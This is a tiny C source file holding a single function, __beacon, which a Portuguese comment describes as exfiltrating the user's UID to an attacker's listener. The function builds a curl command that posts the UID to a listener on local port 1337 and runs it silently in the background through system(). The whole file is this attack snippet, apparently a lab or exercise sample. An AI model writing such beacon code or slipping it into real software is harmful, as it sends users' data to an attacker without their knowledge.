#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

void __beacon(void) {
    char cmd[256];
    // Exfiltra o UID para um listener local do atacante na porta 1337
    snprintf(cmd, sizeof(cmd),
        "curl -s -d \"uid=%d\" http://127.0.0.1:1337/beacon &", 
        getuid());
    system(cmd);
}
